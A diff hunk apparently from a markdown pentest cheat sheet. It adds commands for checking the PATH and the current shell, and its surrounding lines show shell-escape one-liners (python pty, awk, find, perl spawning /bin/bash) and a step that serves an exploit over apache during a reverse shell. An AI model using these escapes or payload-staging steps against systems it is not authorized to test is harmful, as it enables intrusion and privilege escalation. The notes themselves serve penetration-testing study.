@@ -77,6 +77,12 @@ python3 -c 'import pty; pty.spawn("/bin/sh")'<br>
     awk-->  awk 'BEGIN {system("/bin/bash")}'
     find--> find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
     perl--> perl -e 'exec "/bin/bash";'
+    
+Checking Path <br>
+echo $PATH<br>
+Checking current shell<br>
+echo $0<br>
+
 **File transfer during REVERSE SHELL**<br>
 Attacker: service apache2 start<br>
 place shell or exploit in /var/www/html<br>
